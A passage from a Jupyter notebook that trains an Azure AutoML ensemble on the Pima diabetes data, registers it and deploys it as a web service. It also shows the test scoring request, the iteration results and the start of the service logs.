[{\"data\": [0.5148997885404539]}]}, {\"name\": \"f1_score_macro\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.754706392921501]}]}, {\"name\": \"recall_score_micro\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.7865345181134655]}]}, {\"name\": \"average_precision_score_weighted\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.8582797328089278]}]}, {\"name\": \"recall_score_macro\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.7496973152420721]}]}, {\"name\": \"norm_macro_recall\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.499394630484144]}]}, {\"name\": \"recall_score_weighted\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.7865345181134655]}]}, {\"name\": \"AUC_macro\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.8474947459449205]}]}, {\"name\": \"average_precision_score_micro\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.8662922604618177]}]}, {\"name\": \"average_precision_score_macro\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"categories\": [0], \"series\": [{\"data\": [0.8301195616696537]}]}], \"run_logs\": \"\\nRun is completed.\", \"graph\": {}, \"widget_settings\": {\"childWidgetDisplay\": \"popup\", \"send_telemetry\": false, \"log_level\": \"INFO\", \"sdk_version\": \"1.20.0\"}, \"loading\": false}"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "https://ml.azure.com/experiments/automlpimadiabetes/runs/AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea?wsid=/subscriptions/8a086c9c-5530-4791-89af-62c8cdfda3fd/resourcegroups/trn-aue-advanced-analytics-ml/workspaces/trn-aue-aa-ml\n",
      "\n",
      "\n",
      "****************************************************************************************************\n",
      "DATA GUARDRAILS: \n",
      "\n",
      "TYPE:         Cross validation\n",
      "STATUS:       DONE\n",
      "DESCRIPTION:  Each iteration of the trained model was validated through cross-validation.\n",
      "              \n",
      "DETAILS:      \n",
      "+---------------------------------+\n",
      "|Number of folds                  |\n",
      "+=================================+\n",
      "|10                               |\n",
      "+---------------------------------+\n",
      "\n",
      "****************************************************************************************************\n",
      "\n",
      "TYPE:         Class balancing detection\n",
      "STATUS:       PASSED\n",
      "DESCRIPTION:  Your inputs were analyzed, and all classes are balanced in your training data.\n",
      "              Learn more about imbalanced data: https://aka.ms/AutomatedMLImbalancedData\n",
      "\n",
      "****************************************************************************************************\n",
      "\n",
      "TYPE:         Missing feature values imputation\n",
      "STATUS:       PASSED\n",
      "DESCRIPTION:  No feature missing values were detected in the training data.\n",
      "              Learn more about missing value imputation: https://aka.ms/AutomatedMLFeaturization\n",
      "\n",
      "****************************************************************************************************\n",
      "\n",
      "TYPE:         High cardinality feature detection\n",
      "STATUS:       PASSED\n",
      "DESCRIPTION:  Your inputs were analyzed, and no high cardinality features were detected.\n",
      "              Learn more about high cardinality feature handling: https://aka.ms/AutomatedMLFeaturization\n",
      "\n",
      "****************************************************************************************************\n",
      "\n",
      "****************************************************************************************************\n",
      "ITERATION: The iteration being evaluated.\n",
      "PIPELINE: A summary description of the pipeline being evaluated.\n",
      "DURATION: Time taken for the current iteration.\n",
      "METRIC: The result of computing score on the fitted pipeline.\n",
      "BEST: The best observed score thus far.\n",
      "****************************************************************************************************\n",
      "\n",
      " ITERATION   PIPELINE                                       DURATION      METRIC      BEST\n",
      "         0   MaxAbsScaler LightGBM                          0:01:56       0.7981    0.7981\n",
      "         1   MaxAbsScaler XGBoostClassifier                 0:02:50       0.8366    0.8366\n",
      "         2   MaxAbsScaler RandomForest                      0:02:14       0.8184    0.8366\n",
      "         3   MaxAbsScaler RandomForest                      0:02:19       0.8273    0.8366\n",
      "         4   MaxAbsScaler RandomForest                      0:01:52       0.8198    0.8366\n",
      "         5   MaxAbsScaler ExtremeRandomTrees                0:02:16       0.8168    0.8366\n",
      "         6   MaxAbsScaler ExtremeRandomTrees                0:01:53       0.8095    0.8366\n",
      "         7   MaxAbsScaler ExtremeRandomTrees                0:02:01       0.7975    0.8366\n",
      "         8   MaxAbsScaler RandomForest                      0:02:01       0.8032    0.8366\n",
      "         9   MaxAbsScaler ExtremeRandomTrees                0:02:01       0.7863    0.8366\n",
      "        10   MaxAbsScaler RandomForest                      0:02:11       0.8158    0.8366\n",
      "        11   MaxAbsScaler RandomForest                      0:01:53       0.8077    0.8366\n",
      "        12   MaxAbsScaler RandomForest                      0:02:13       0.7730    0.8366\n",
      "        13   StandardScalerWrapper XGBoostClassifier        0:01:59       0.8208    0.8366\n",
      "        14   MaxAbsScaler RandomForest                      0:01:56       0.8206    0.8366\n",
      "        15   StandardScalerWrapper ExtremeRandomTrees       0:02:00       0.8183    0.8366\n",
      "        16   MaxAbsScaler ExtremeRandomTrees                0:01:48       0.8147    0.8366\n",
      "        17   MaxAbsScaler ExtremeRandomTrees                0:02:04       0.8104    0.8366\n",
      "        18   MaxAbsScaler RandomForest                      0:02:05       0.8039    0.8366\n",
      "        19   MaxAbsScaler LightGBM                          0:01:59       0.8223    0.8366\n",
      "        20   MaxAbsScaler LogisticRegression                0:02:02       0.8210    0.8366\n",
      "        21   StandardScalerWrapper XGBoostClassifier        0:01:53       0.8240    0.8366\n",
      "        22   MaxAbsScaler LightGBM                          0:02:00       0.8152    0.8366\n",
      "        23   StandardScalerWrapper XGBoostClassifier        0:02:00       0.8161    0.8366\n",
      "        24   StandardScalerWrapper XGBoostClassifier        0:02:04       0.8298    0.8366\n",
      "        25   StandardScalerWrapper XGBoostClassifier        0:02:04       0.7868    0.8366\n",
      "        26   StandardScalerWrapper XGBoostClassifier        0:02:22       0.8152    0.8366\n",
      "        27   StandardScalerWrapper XGBoostClassifier        0:02:03       0.8133    0.8366\n",
      "        28   SparseNormalizer XGBoostClassifier             0:01:56       0.7223    0.8366\n",
      "        29   StandardScalerWrapper LogisticRegression       0:01:59       0.8245    0.8366\n",
      "        30   TruncatedSVDWrapper XGBoostClassifier          0:02:05       0.8043    0.8366\n",
      "        31   StandardScalerWrapper XGBoostClassifier        0:01:52       0.8127    0.8366\n",
      "        32   MaxAbsScaler ExtremeRandomTrees                0:01:55       0.8348    0.8366\n",
      "        33   SparseNormalizer XGBoostClassifier             0:02:05       0.6816    0.8366\n",
      "        34   StandardScalerWrapper LogisticRegression       0:02:00       0.8073    0.8366\n",
      "        35                                                  0:01:32          nan    0.8366\n",
      "        36   MaxAbsScaler LightGBM                          0:01:27          nan    0.8366\n",
      "        37                                                  0:00:08          nan    0.8366\n",
      "        38    VotingEnsemble                                0:03:19       0.8475    0.8475\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "[('1',\n",
       "  Pipeline(memory=None,\n",
       "           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n",
       "                  ('xgboostclassifier',\n",
       "                   XGBoostClassifier(base_score=0.5, booster='gbtree',\n",
       "                                     colsample_bylevel=1, colsample_bynode=1,\n",
       "                                     colsample_bytree=1, gamma=0,\n",
       "                                     learning_rate=0.1, max_delta_step=0,\n",
       "                                     max_depth=3, min_child_weight=1, missing=nan,\n",
       "                                     n_estimators=100, n_jobs=1, nthread=None,\n",
       "                                     objective='binary:logistic', random_state=0,\n",
       "                                     reg_alpha=0, reg_lambda=1,\n",
       "                                     scale_pos_weight=1, seed=None, silent=None,\n",
       "                                     subsample=1, tree_method='auto', verbose=-10,\n",
       "                                     verbosity=0))],\n",
       "           verbose=False)),\n",
       " ('32',\n",
       "  Pipeline(memory=None,\n",
       "           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n",
       "                  ('extratreesclassifier',\n",
       "                   ExtraTreesClassifier(bootstrap=True, ccp_alpha=0.0,\n",
       "                                        class_weight='balanced', criterion='gini',\n",
       "                                        max_depth=None, max_features=None,\n",
       "                                        max_leaf_nodes=None, max_samples=None,\n",
       "                                        min_impurity_decrease=0.0,\n",
       "                                        min_impurity_split=None,\n",
       "                                        min_samples_leaf=0.01,\n",
       "                                        min_samples_split=0.056842105263157895,\n",
       "                                        min_weight_fraction_leaf=0.0,\n",
       "                                        n_estimators=50, n_jobs=1, oob_score=True,\n",
       "                                        random_state=None, verbose=0,\n",
       "                                        warm_start=False))],\n",
       "           verbose=False)),\n",
       " ('24',\n",
       "  Pipeline(memory=None,\n",
       "           steps=[('standardscalerwrapper',\n",
       "                   <azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f887eec3be0>),\n",
       "                  ('xgboostclassifier',\n",
       "                   XGBoostClassifier(base_score=0.5, booster='gbtree',\n",
       "                                     colsample_bylevel=1, colsample_bynode=1,\n",
       "                                     colsample_bytree=1, eta=0.2, gamma=0.01,\n",
       "                                     learning_rate=0.1, max_delta_step=0,\n",
       "                                     max_depth=7, max_leaves=0,\n",
       "                                     min_child_weight=1, missing=nan,\n",
       "                                     n_estimators=50, n_jobs=1, nthread=None,\n",
       "                                     objective='reg:logistic', random_state=0,\n",
       "                                     reg_alpha=1.3541666666666667,\n",
       "                                     reg_lambda=0.625, scale_pos_weight=1,\n",
       "                                     seed=None, silent=None, subsample=1,\n",
       "                                     tree_method='auto', verbose=-10,\n",
       "                                     verbosity=0))],\n",
       "           verbose=False)),\n",
       " ('3',\n",
       "  Pipeline(memory=None,\n",
       "           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n",
       "                  ('randomforestclassifier',\n",
       "                   RandomForestClassifier(bootstrap=True, ccp_alpha=0.0,\n",
       "                                          class_weight='balanced',\n",
       "                                          criterion='gini', max_depth=None,\n",
       "                                          max_features='log2',\n",
       "                                          max_leaf_nodes=None, max_samples=None,\n",
       "                                          min_impurity_decrease=0.0,\n",
       "                                          min_impurity_split=None,\n",
       "                                          min_samples_leaf=0.01,\n",
       "                                          min_samples_split=0.01,\n",
       "                                          min_weight_fraction_leaf=0.0,\n",
       "                                          n_estimators=25, n_jobs=1,\n",
       "                                          oob_score=True, random_state=None,\n",
       "                                          verbose=0, warm_start=False))],\n",
       "           verbose=False)),\n",
       " ('29',\n",
       "  Pipeline(memory=None,\n",
       "           steps=[('standardscalerwrapper',\n",
       "                   <azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f887eccd400>),\n",
       "                  ('logisticregression',\n",
       "                   LogisticRegression(C=0.2682695795279725,\n",
       "                                      class_weight='balanced', dual=False,\n",
       "                                      fit_intercept=True, intercept_scaling=1,\n",
       "                                      l1_ratio=None, max_iter=100,\n",
       "                                      multi_class='ovr', n_jobs=1, penalty='l2',\n",
       "                                      random_state=None, solver='newton-cg',\n",
       "                                      tol=0.0001, verbose=0, warm_start=False))],\n",
       "           verbose=False)),\n",
       " ('14',\n",
       "  Pipeline(memory=None,\n",
       "           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n",
       "                  ('randomforestclassifier',\n",
       "                   RandomForestClassifier(bootstrap=True, ccp_alpha=0.0,\n",
       "                                          class_weight=None, criterion='gini',\n",
       "                                          max_depth=None, max_features='log2',\n",
       "                                          max_leaf_nodes=None, max_samples=None,\n",
       "                                          min_impurity_decrease=0.0,\n",
       "                                          min_impurity_split=None,\n",
       "                                          min_samples_leaf=0.01,\n",
       "                                          min_samples_split=0.01,\n",
       "                                          min_weight_fraction_leaf=0.0,\n",
       "                                          n_estimators=10, n_jobs=1,\n",
       "                                          oob_score=False, random_state=None,\n",
       "                                          verbose=0, warm_start=False))],\n",
       "           verbose=False)),\n",
       " ('15',\n",
       "  Pipeline(memory=None,\n",
       "           steps=[('standardscalerwrapper',\n",
       "                   <azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f887ec52908>),\n",
       "                  ('extratreesclassifier',\n",
       "                   ExtraTreesClassifier(bootstrap=False, ccp_alpha=0.0,\n",
       "                                        class_weight=None, criterion='gini',\n",
       "                                        max_depth=None, max_features=None,\n",
       "                                        max_leaf_nodes=None, max_samples=None,\n",
       "                                        min_impurity_decrease=0.0,\n",
       "                                        min_impurity_split=None,\n",
       "                                        min_samples_leaf=0.06157894736842105,\n",
       "                                        min_samples_split=0.15052631578947367,\n",
       "                                        min_weight_fraction_leaf=0.0,\n",
       "                                        n_estimators=10, n_jobs=1,\n",
       "                                        oob_score=False, random_state=None,\n",
       "                                        verbose=0, warm_start=False))],\n",
       "           verbose=False)),\n",
       " ('17',\n",
       "  Pipeline(memory=None,\n",
       "           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n",
       "                  ('extratreesclassifier',\n",
       "                   ExtraTreesClassifier(bootstrap=True, ccp_alpha=0.0,\n",
       "                                        class_weight='balanced', criterion='gini',\n",
       "                                        max_depth=None, max_features='log2',\n",
       "                                        max_leaf_nodes=None, max_samples=None,\n",
       "                                        min_impurity_decrease=0.0,\n",
       "                                        min_impurity_split=None,\n",
       "                                        min_samples_leaf=0.01,\n",
       "                                        min_samples_split=0.01,\n",
       "                                        min_weight_fraction_leaf=0.0,\n",
       "                                        n_estimators=50, n_jobs=1, oob_score=True,\n",
       "                                        random_state=None, verbose=0,\n",
       "                                        warm_start=False))],\n",
       "           verbose=False)),\n",
       " ('30',\n",
       "  Pipeline(memory=None,\n",
       "           steps=[('truncatedsvdwrapper',\n",
       "                   TruncatedSVDWrapper(n_components=0.7521052631578947,\n",
       "                                       random_state=None)),\n",
       "                  ('xgboostclassifier',\n",
       "                   XGBoostClassifier(base_score=0.5, booster='gbtree',\n",
       "                                     colsample_bylevel=1, colsample_bynode=1,\n",
       "                                     colsample_bytree=0.8, eta=0.3, gamma=0,\n",
       "                                     learning_rate=0.1, max_delta_step=0,\n",
       "                                     max_depth=10, max_leaves=511,\n",
       "                                     min_child_weight=1, missing=nan,\n",
       "                                     n_estimators=50, n_jobs=1, nthread=None,\n",
       "                                     objective='reg:logistic', random_state=0,\n",
       "                                     reg_alpha=0.8333333333333334,\n",
       "                                     reg_lambda=1.9791666666666667,\n",
       "                                     scale_pos_weight=1, seed=None, silent=None,\n",
       "                                     subsample=1, tree_method='auto', verbose=-10,\n",
       "                                     verbosity=0))],\n",
       "           verbose=False))]"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from azureml.widgets import RunDetails\n",
    "\n",
    "RunDetails(remote_run).show()\n",
    "print(remote_run.get_portal_url())\n",
    "remote_run.wait_for_completion(show_output=True)\n",
    "\n",
    "\n",
    "best_run, fitted_model = remote_run.get_output()\n",
    "\n",
    "fitted_model.steps[1][1].estimators"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {
    "gather": {
     "logged": 1612219124722
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Run(Experiment: automlpimadiabetes,\n",
      "Id: AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_38,\n",
      "Type: azureml.scriptrun,\n",
      "Status: Completed)\n",
      "0.8474947459449205\n"
     ]
    }
   ],
   "source": [
    "# Print Best Run\n",
    "\n",
    "print(best_run)\n",
    "\n",
    "print(best_run.properties['score'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {
    "gather": {
     "logged": 1612219131195
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Pipeline(memory=None,\n",
      "         steps=[('datatransformer',\n",
      "                 DataTransformer(enable_dnn=None, enable_feature_sweeping=None,\n",
      "                                 feature_sweeping_config=None,\n",
      "                                 feature_sweeping_timeout=None,\n",
      "                                 featurization_config=None, force_text_dnn=None,\n",
      "                                 is_cross_validation=None,\n",
      "                                 is_onnx_compatible=None, logger=None,\n",
      "                                 observer=None, task=None, working_dir=None)),\n",
      "                ('prefittedsoftvotingclassifier',...\n",
      "                                                                                               reg_lambda=1.9791666666666667,\n",
      "                                                                                               scale_pos_weight=1,\n",
      "                                                                                               seed=None,\n",
      "                                                                                               silent=None,\n",
      "                                                                                               subsample=1,\n",
      "                                                                                               tree_method='auto',\n",
      "                                                                                               verbose=-10,\n",
      "                                                                                               verbosity=0))],\n",
      "                                                                     verbose=False))],\n",
      "                                               flatten_transform=None,\n",
      "                                               weights=[0.15384615384615385,\n",
      "                                                        0.07692307692307693,\n",
      "                                                        0.15384615384615385,\n",
      "                                                        0.07692307692307693,\n",
      "                                                        0.07692307692307693,\n",
      "                                                        0.07692307692307693,\n",
      "                                                        0.07692307692307693,\n",
      "                                                        0.15384615384615385,\n",
      "                                                        0.15384615384615385]))],\n",
      "         verbose=False)\n",
      "Y_transformer(['LabelEncoder', LabelEncoder()])\n"
     ]
    }
   ],
   "source": [
    "# Print Fitted Model\n",
    "\n",
    "print(fitted_model)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Best Model\n",
    "\n",
    "Get the best model from the automl experiments and display all the properties of the model.\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {
    "gather": {
     "logged": 1612219144417
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Run(Experiment: automlpimadiabetes,\n",
      "Id: AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_38,\n",
      "Type: azureml.scriptrun,\n",
      "Status: Completed)\n",
      "Pipeline(memory=None,\n",
      "         steps=[('datatransformer',\n",
      "                 DataTransformer(enable_dnn=None, enable_feature_sweeping=None,\n",
      "                                 feature_sweeping_config=None,\n",
      "                                 feature_sweeping_timeout=None,\n",
      "                                 featurization_config=None, force_text_dnn=None,\n",
      "                                 is_cross_validation=None,\n",
      "                                 is_onnx_compatible=None, logger=None,\n",
      "                                 observer=None, task=None, working_dir=None)),\n",
      "                ('prefittedsoftvotingclassifier',...\n",
      "                                                                                               reg_lambda=1.9791666666666667,\n",
      "                                                                                               scale_pos_weight=1,\n",
      "                                                                                               seed=None,\n",
      "                                                                                               silent=None,\n",
      "                                                                                               subsample=1,\n",
      "                                                                                               tree_method='auto',\n",
      "                                                                                               verbose=-10,\n",
      "                                                                                               verbosity=0))],\n",
      "                                                                     verbose=False))],\n",
      "                                               flatten_transform=None,\n",
      "                                               weights=[0.15384615384615385,\n",
      "                                                        0.07692307692307693,\n",
      "                                                        0.15384615384615385,\n",
      "                                                        0.07692307692307693,\n",
      "                                                        0.07692307692307693,\n",
      "                                                        0.07692307692307693,\n",
      "                                                        0.07692307692307693,\n",
      "                                                        0.15384615384615385,\n",
      "                                                        0.15384615384615385]))],\n",
      "         verbose=False)\n",
      "Y_transformer(['LabelEncoder', LabelEncoder()])\n",
      "Best run id: AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_38\n",
      "################################\n",
      "\n",
      " AUC_weighted: 0.8474947459449205\n",
      "################################\n",
      "\n",
      " Learning rate: []\n",
      "################################\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "{'_aml_system_azureml.automlComponent': 'AutoML',\n",
       " '_aml_system_ComputeTargetStatus': '{\"AllocationState\":\"steady\",\"PreparingNodeCount\":0,\"RunningNodeCount\":4,\"CurrentNodeCount\":5}',\n",
       " 'ensembled_iterations': '[1, 32, 24, 3, 29, 14, 15, 17, 30]',\n",
       " 'ensembled_algorithms': \"['XGBoostClassifier', 'ExtremeRandomTrees', 'XGBoostClassifier', 'RandomForest', 'LogisticRegression', 'RandomForest', 'ExtremeRandomTrees', 'ExtremeRandomTrees', 'XGBoostClassifier']\",\n",
       " 'ensemble_weights': '[0.15384615384615385, 0.07692307692307693, 0.15384615384615385, 0.07692307692307693, 0.07692307692307693, 0.07692307692307693, 0.07692307692307693, 0.15384615384615385, 0.15384615384615385]',\n",
       " 'best_individual_pipeline_score': '0.8366210317228242',\n",
       " 'best_individual_iteration': '1',\n",
       " '_aml_system_automl_is_child_run_end_telemetry_event_logged': 'True',\n",
       " 'model_explain_run_id': 'AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_ModelExplain',\n",
       " 'model_explanation': 'True'}"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import joblib\n",
    "import azureml.train.automl\n",
    "\n",
    "# Get your best run and save the model from that run.\n",
    "\n",
    "#!pip install azureml-train-automl-runtime==1.20.0\n",
    "\n",
    "#!pip install azureml-sklearn\n",
    "\n",
    "if \"output\" not in os.listdir():\n",
    "   os.mkdir(\"./output\")   \n",
    "\n",
    "remote_run.get_metrics('AUC_weighted')\n",
    "\n",
    "best_run, fitted_model = remote_run.get_output()\n",
    "print(best_run)\n",
    "print(fitted_model)\n",
    "\n",
    "#best_run = remote_run.get_best_child()\n",
    "best_run_metrics = best_run.get_metrics()\n",
    "parameter_values = best_run.get_details()['runDefinition']['arguments']\n",
    "\n",
    "print ('Best run id:',best_run.id)\n",
    "print ('################################')\n",
    "print ('\\n AUC_weighted:',best_run_metrics['AUC_weighted'])\n",
    "print ('################################')\n",
    "print ('\\n Learning rate:', parameter_values)\n",
    "print ('################################')\n",
    "\n",
    "\n",
    "best_run.get_details()\n",
    "best_run.get_tags()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "gather": {
     "logged": 1611657251126
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['./output/Capstone_automl_best.joblib']"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\n",
    "best_run.get_file_names()\n",
    "joblib.dump(parameter_values,filename='./output/Capstone_automl_best.joblib')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Model Deployment\n",
    "\n",
    "Remember you have to deploy only one of the two models you trained.. Perform the steps in the rest of this notebook only if you wish to deploy this model.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {
    "gather": {
     "logged": 1611664012368
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "automlpimadiabetes\tautomlpimadiabetes:3\t3\n"
     ]
    }
   ],
   "source": [
    "\n",
    "model_dep = remote_run.register_model(model_name='automlpimadiabetes',\n",
    "                           tags={'Name': 'Pima Diabetes Best AutoML Model'})#,\n",
    "                           #model_path='outputs/automldiabetesbmodel.pkl')\n",
    "print(model_dep.name, model_dep.id, model_dep.version, sep='\\t')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true,
    "gather": {
     "logged": 1598431657736
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "source": [
    "## Register the WebService"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {
    "gather": {
     "logged": 1598432707604
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Tips: You can try get_logs(): https://aka.ms/debugimage#dockerlog or local deployment: https://aka.ms/debugimage#debug-locally to debug if deployment takes longer than 10 minutes.\n",
      "Running........................................................................................................................."
     ]
    }
   ],
   "source": [
    "from azureml.core.webservice import AciWebservice, Webservice\n",
    "from azureml.core.model import Model\n",
    "from azureml.core.environment import Environment\n",
    "from azureml.core.model import InferenceConfig\n",
    "\n",
    "bestmodel, fmodel = remote_run.get_output()\n",
    "bestmodel.download_file('outputs/scoring_file_v_1_0_0.py', 'scoring.py')  \n",
    "#bestmodel.download_file('outputs/conda_env_v_1_0_0.yml', myenv)  \n",
    "\n",
    "#env = Environment.get(ws, \"AzureML-Minimal\").clone('temp')\n",
    "#env = Environment.get(ws, \"AzureML-Minimal\",'myenv')\n",
    "#env = Environment.from_conda_specification(name='automl',file_path='conda_env_v_1_0_0.yml')\n",
    "\n",
    "env = bestmodel.get_environment()\n",
    "\n",
    "for pip_package in [\"scikit-learn\"]:\n",
    "    env.python.conda_dependencies.add_pip_package(pip_package)\n",
    "\n",
    "inference_config = InferenceConfig(entry_script='scoring.py',\n",
    "                                    environment=env)\n",
    "\n",
    "\n",
    "deployment_config = AciWebservice.deploy_configuration(cpu_cores = 1, memory_gb = 1)\n",
    "service = Model.deploy(ws, \"pimadiabetesendpv3\", [model_dep], inference_config, deployment_config)\n",
    "service.wait_for_deployment(show_output = True)\n",
    "print(service.state)\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true,
    "gather": {
     "logged": 1598432765711
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "source": [
    "## Test and delete WebService"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {
    "gather": {
     "logged": 1612090065832
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://159a4ac6-4925-4238-bd97-dbe0430d3a97.australiaeast.azurecontainer.io/score\n",
      "<Response [200]>\n",
      "\"{\\\"result\\\": [\\\"tested_negative\\\", \\\"tested_positive\\\", \\\"tested_negative\\\"]}\"\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "import json\n",
    "from azureml.core.authentication import InteractiveLoginAuthentication\n",
    "from azureml.core.webservice import AciWebservice, Webservice\n",
    "\n",
    "\n",
    "service = Webservice(workspace=ws, name='pimadiabetesendpv3')\n",
    "print(service.scoring_uri)\n",
    "scoring_uri = service.scoring_uri\n",
    "#print(service.swagger_uri)\n",
    "\n",
    "# Set the content type\n",
    "headers = {'Content-Type': 'application/json'}\n",
    "# If authentication is enabled, set the authorization header\n",
    "headers['Authorization'] = f'Bearer {key}'\n",
    "\n",
    "# URL for the web service\n",
    "#scoring_uri = '<your web service URI>'\n",
    "# If the service is authenticated, set the key or token\n",
    "#key = '<your key or token>'\n",
    "\n",
    "# Two sets of data to score, so we get two results back\n",
    "data = {\"data\":\n",
    "        [\n",
    "            [\n",
    "                1,\n",
    "                150,\n",
    "                80,\n",
    "                29,\n",
    "                0,\n",
    "                28.1,\n",
    "                0.627,\n",
    "                25,\n",
    "            ],\n",
    "            [\n",
    "               3,\n",
    "                150,\n",
    "                80,\n",
    "                29,\n",
    "                0,\n",
    "                28.1,\n",
    "                0.627,\n",
    "                44,],\n",
    "            [\n",
    "               1,\n",
    "                150,\n",
    "                80,\n",
    "                29,\n",
    "                0,\n",
    "                28.1,\n",
    "                0.627,\n",
    "                21,]\n",
    "        ]\n",
    "        }\n",
    "# Convert to JSON string\n",
    "input_data = json.dumps(data)\n",
    "\n",
    "# Make the request and display the response\n",
    "resp = requests.post(scoring_uri, input_data, headers=headers)\n",
    "print (resp)\n",
    "print(resp.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "source": [
    "## Enable Logging and Log Capture"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {
    "collapsed": true,
    "gather": {
     "logged": 1612090088330
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2021-01-27T06:52:43,124305994+00:00 - gunicorn/run \n",
      "2021-01-27T06:52:43,128030409+00:00 - rsyslog/run \n",
      "2021-01-27T06:52:43,136000842+00:00 - iot-server/run \n",
      "2021-01-27T06:52:43,144888178+00:00 - nginx/run \n",
      "/usr/sbin/nginx: /azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/libcrypto.so.1.0.0: no version information available (required by /usr/sbin/nginx)\n",
      "/usr/sbin/nginx: /azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/libcrypto.so.1.0.0: no version information available (required by /usr/sbin/nginx)\n",
      "/usr/sbin/nginx: /azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/libssl.so.1.0.0: no version information available (required by /usr/sbin/nginx)\n",
      "/usr/sbin/nginx: /azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/libssl.so.1.0.0: no version information available (required by /usr/sbin/nginx)\n",
      "/usr/sbin/nginx: /azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/libssl.so.1.0.0: no version information available (required by /usr/sbin/nginx)\n",
